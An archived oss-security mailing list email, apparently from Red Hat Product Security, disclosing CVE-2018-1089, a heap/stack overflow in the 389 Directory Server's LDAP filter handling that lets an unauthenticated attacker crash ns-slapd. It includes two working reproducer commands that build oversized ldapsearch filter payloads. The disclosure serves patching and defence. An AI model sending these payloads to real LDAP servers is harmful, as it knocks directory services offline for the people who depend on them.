X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1459" "Monday" "7" "May" "2018" "17:30:57" "+0200" "Cedric Buissart" "cbuissar@redhat.com" "<CAKG8Do7DJOj05DgTnztiM7O780z3kXmKRoeNy6yB5_Yr1Uahwg@mail.gmail.com>" "43" "[oss-security] CVE-2018-1089 389-ds-base: unauthenticated ns-slapd crash via large filter value in ldapsearch" nil nil nil "5" "2018050715:30:57" "[oss-security] CVE-2018-1089 389-ds-base: unauthenticated ns-slapd crash via large filter value in ldapsearch" (number mark "U       cbuissar@red May  7   43/1459  " thread-indent "\"[oss-security] CVE-2018-1089 389-ds-base: unauthenticated ns-slapd crash via large filter value in ldapsearch\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26061 invoked by uid 550); 7 May 2018 15:31:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26012 invoked from network); 7 May 2018 15:31:30 -0000
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=rpfD76LCCldR6iflWaIEL+Fv6qS1Biv7+rDq1QeRRbs=;
        b=KT8Bztg7MUdBFLxONRlBV7nQiCwNbME10epicWkfT0rQ5nBsiJrZk54VdCpf+vamSd
         Hx0YyUyFumw06BLYEVEDXhRhPV5r+3L0ZY/OGT5F8i8rfkjfXzqio5rsUn65SRC2gV/Y
         C4F/UaW5lRFP4KmMKSZ1e4pSBWYh9XBhrYuPCtqdicoKR7p9l3jxzbPPdocsTiSvokzx
         o3h2q1EPyDb5XTcv/egPwe+8UgnKULMvKEweCTCLXG0LX+rx3kIcqmlDzibsEFX4UYtA
         0t2hnfhWYocR6raF92RSnh0c3lOGz3EWNdylcOIpnlD2mW/qRL9mHkPToU1HnQVzenSm
         khZQ==
X-Gm-Message-State: ALQs6tDqDD9qXKNa/VTkLsyYafNP4KB8y8l31rGFrvHH1vXEXVXBMvQA
	WrMfnSnmRwZbBthYy0LAXoywsw8r7dylMjw4sLjHRjQY
X-Google-Smtp-Source: AB8JxZqoO6vjuUr3NEDLQNut5Cxb6wC5eoJo89fJYOm7FTXZ0qGr3qIHhQ2L5nKJtZyTleBboiMBmC5hbGUE9bT0aKQ=
X-Received: by 2002:a6b:6f0a:: with SMTP id k10-v6mr41847325ioc.93.1525707078450;
 Mon, 07 May 2018 08:31:18 -0700 (PDT)
MIME-Version: 1.0
From: Cedric Buissart <cbuissar@redhat.com>
Date: Mon, 7 May 2018 17:30:57 +0200
Message-ID: <CAKG8Do7DJOj05DgTnztiM7O780z3kXmKRoeNy6yB5_Yr1Uahwg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="0000000000007154ff056b9f5c6f"
Subject: [oss-security] CVE-2018-1089 389-ds-base: unauthenticated ns-slapd crash via large
 filter value in ldapsearch

--0000000000007154ff056b9f5c6f
Content-Type: text/plain; charset="UTF-8"

Hi all,

This is to disclose the following flaw, CVE-2018-1089 :

389-ds-base, a.k.a 389 Directory Server, https://pagure.io/389-ds-base/,
is a highly usable, fully featured, reliable and secure LDAP server
implementation. It handles many of the largest LDAP deployments in the
world.

389-ds server did not properly handle characters needed to be escaped in
its query filter. This could result in buffer overflows, from the heap
or the stack, on larger filters.  An unauthenticated attacker could send
a specially crafted LDAP request and crash the server. RCE has not been
demonstrated at this time.

Red Hat would like to thank Greg Kubok for alerting us of the issue.


Reproducer1 :
[root@server1 ~]# payload=$(printf '.*$%.0s' {1..1000})
[root@server1 ~]# ldapsearch -h localhost -p 389 -x -b "dc=blah"
"(&(|(telephoneNumber=*${payload}*)(uid=*${payload}*)(title=*${payload}*)(sn=*${payload}*)(ou=*${payload}*)(givenName=*${payload}*))(objectClass=posixaccount))"
"telephoneNumber sshpubkeyfp ipaSshPubKey uid krbCanonicalName title
loginShell uidNumber gidNumber sn homeDirectory mail krbPrincipalName
givenName nsAccountLock"

Reproducer2:
[root@server1 ~]# perl -e 'print ".*\$" x (1400)' | ldapsearch -x -f-
"(&(uid=%s)(objectClass=posixaccount))"


Patch attached for versions 1.3.7 & 1.2.11

Thanks!

-- 
Cedric Buissart,
Product Security

--0000000000007154ff056b9f5c6f--
